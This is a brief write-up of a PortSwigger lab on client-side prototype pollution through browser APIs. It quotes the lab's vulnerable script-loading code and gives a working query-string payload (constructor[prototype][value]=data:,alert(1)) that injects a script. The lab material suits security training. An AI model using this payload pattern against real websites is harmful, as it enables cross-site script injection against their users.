# [Client-side prototype pollution via browser APIs] — [PortSwigger] — [Practitioner]
**Date:** 2026-08-04
 
---
 
## Vulnerability / core concept
Prototype Pollution via APIs

---


## Payload / key command
We can see the `searchLoggerConfigurable.js` file in the Sources in developer tools:
```js
async function searchLogger() {
    let config = {params: deparam(new URL(location).searchParams.toString()), transport_url: false};
    Object.defineProperty(config, 'transport_url', {configurable: false, writable: false});
    if(config.transport_url) {
        let script = document.createElement('script');
        script.src = config.transport_url;
        document.body.appendChild(script);
    }
    if(config.params && config.params.search) {
        await logQuery('/logger', config.params);
    }
}
```
As you can see they made the `transport_url` unconfigurable and unwritable. However, they did not set `value` property for it; therefore, it inherits the value from `Object.prototype`. If we pollute the prototype, `transport_url` will be assigned that `value` permanently.

My payload for this lab was the following:
```js
/?constructor[prototype][value]=data:,alert(1)
```
This executes the `alert(1)` and solves this lab.
